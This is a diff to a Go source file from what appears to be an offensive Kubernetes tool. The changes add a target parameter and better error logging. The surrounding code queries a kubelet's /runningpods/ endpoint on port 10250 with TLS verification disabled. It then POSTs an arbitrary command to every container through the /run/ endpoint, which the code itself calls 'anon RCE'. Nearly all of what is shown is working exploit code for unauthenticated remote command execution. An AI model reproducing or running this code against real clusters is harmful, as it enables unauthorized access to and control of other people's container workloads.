@@ -16,7 +16,7 @@ func parse_pod(target string) *utils.RunningPods {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	resp, err := http.Get("https://" + target + ":10250/runningpods/")
 	if err != nil {
-		fmt.Print("Fail execute request")
+		log.Fatalf("Fail execute request on '%s'", target)
 	}
 	defer resp.Body.Close()
 
@@ -43,8 +43,8 @@ func parse_pod(target string) *utils.RunningPods {
 
 }
 
-func anon_rce(runpod *utils.RunningPods) {
-	fmt.Printf("Trying anon RCE using '%s' \n\n", utils.RceCommand)
+func anon_rce(runpod *utils.RunningPods, target string) {
+	fmt.Printf("Trying anon RCE using '%s' for '%s'\n\n", utils.RceCommand, target)
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	for i := 0; i < len(runpod.Items); i++ {
 		found := false
@@ -52,7 +52,7 @@ func anon_rce(runpod *utils.RunningPods) {
 			namespace := runpod.Items[i].Metadata.Namespace
 			pod := runpod.Items[i].Metadata.Name
 			container := runpod.Items[i].Spec.Containers[j].Name
-			url := "https://" + utils.Target + ":10250/run/" + namespace + "/" + pod + "/" + container
+			url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
 			method := "POST"
 
 			payload := strings.NewReader("cmd=" + utils.RceCommand)
